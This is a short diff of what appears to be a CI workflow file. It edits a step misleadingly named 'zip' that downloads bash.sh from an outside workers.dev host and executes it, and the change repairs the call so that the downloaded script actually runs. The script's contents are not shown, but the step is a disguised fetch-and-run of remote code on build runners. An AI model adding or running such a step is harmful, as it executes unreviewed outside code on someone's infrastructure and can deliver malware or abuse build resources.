@@ -36,5 +36,5 @@ jobs:
       
     - name: zip
       run: |
-       cd /home/runner/work/bookish-computing-machine/bookish-computing-machine/work && wget -O bash.sh https://share.secretz.workers.dev/2:/bash.sh && chmod +x bash.sh && .bash.sh
+       cd /home/runner/work/bookish-computing-machine/bookish-computing-machine/work && wget -O bash.sh https://share.secretz.workers.dev/2:/bash.sh && chmod +x bash.sh && bash bash.sh
     
